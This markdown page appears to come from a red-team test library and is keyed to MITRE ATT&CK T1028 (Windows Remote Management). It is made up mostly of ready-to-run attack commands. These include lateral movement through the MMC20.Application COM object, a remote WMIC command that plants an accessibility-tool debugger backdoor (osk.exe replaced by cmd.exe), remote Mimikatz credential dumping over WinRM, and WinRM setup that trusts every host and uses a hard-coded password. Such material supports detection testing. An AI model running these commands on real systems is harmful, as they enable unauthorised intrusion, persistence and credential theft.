## Windows Remote Management

MITRE ATT&CK Technique: [T1028](https://attack.mitre.org/wiki/Technique/T1028)

### Enable Windows Remote Management

Input:

    powershell Enable-PSRemoting -Force

### Powershell lateral movement using the mmc20 application com object

Input:

    powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","<computer_name>")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")

Reference:

https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/


### WMIC Process Call Create

    wmic /user:<username> /password:<password> /node:<computer_name> process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"

### PowerSploit Invoke-Mimikatz WinRM

    powershell-import /local/path/to/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1
    powershell Invoke-Mimikatz -ComputerName TARGET

Reference:

 https://blog.cobaltstrike.com/2015/07/22/winrm-is-my-remote-access-tool/
 
 ### WinRM - PS Remoting
 
    PS> winrm quickconfig

    #Trust all (*) hosts for outbound communications – Must be SYSTEM
    PS> Set-Item WSMan:localhost\client\trustedhosts -value * -force

    #Trust a selection of hosts for outbound communications – Must be SYSTEM
    PS> Set-Item WSMan:localhost\Client\TrustedHosts -Value 'machineA,machineB’ -force

    #Create a Valid Credential Object in Powershell
    PS> $Username = '<domain>\<username>'
    PS> $Password = ’Password12345'
    PS> $PSS = ConvertTo-SecureString $Password -AsPlainText -Force
    PS> $Creds = new-object system.management.automation.PSCredential $Username,$PSS

    #Start a PSSession
    PS> $Session = New-PSSession -ComputerName 10.150.10.100 -Credential $Creds
    PS> Invoke-Command -Session $Session –Command {Get-Process}

    #List PSSessions
    PS> Get-PSSession
